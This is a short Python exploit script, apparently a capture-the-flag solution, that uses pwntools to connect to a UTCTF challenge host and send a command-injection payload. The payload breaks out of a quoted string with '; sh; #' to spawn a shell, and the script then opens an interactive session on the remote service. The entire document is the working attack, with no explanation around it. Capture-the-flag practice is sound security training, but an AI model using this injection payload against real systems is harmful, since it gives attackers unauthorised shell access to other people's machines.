#!/usr/bin/python
import pwn

str = b"toto\xf0'; sh; #"

s = pwn.remote("pwn.utctf.live", 5434)
s.sendline(str)
s.interactive()